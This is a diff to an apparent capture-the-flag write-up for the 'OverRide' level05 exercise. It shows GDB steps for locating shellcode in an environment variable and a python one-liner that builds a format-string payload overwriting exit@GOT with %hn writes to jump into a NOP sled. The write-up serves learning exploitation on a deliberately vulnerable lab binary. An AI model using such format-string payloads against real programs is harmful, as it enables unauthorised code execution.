@@ -42,16 +42,12 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 
 * We need an address inside the NOP sled. In our previous GDB run, we found:
   ```gdb
-  (gdb) x/s *(char **)environ
+  (gdb) break fgets
+  (gdb) run
+  (gdb) p (char *)getenv("SHELLCODE")
+  (gdb) x/20bx (char *)getenv("SHELLCODE")
   0xffffd85b: "SHELLCODE=..."
   ```
-
-  `SHELLCODE=` takes 10 bytes, so the NOP sled starts at:
-
-  ```text
-  0xffffd85b + 10 = 0xffffd865
-  ```
-
   We chose `0xffffd869`, an address inside the NOP sled.
 
   **Note:** This address is specific to that execution. We must verify it again if the environment or NOP sled size changes.
@@ -83,7 +79,8 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
   [exit@GOT][exit@GOT+2][padding][%10$hn][padding][%11$hn]
   ```
 
-* Let's construct the payload:
+* Let's construct the payload 
+* I made a whole [program](tools/payload) that builds the payload depending on the NOP address we give him:
   ```console
   level05@OverRide:~$ python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55393d%10$hn" + "%10134d%11$hn")' > /tmp/level05
   ```
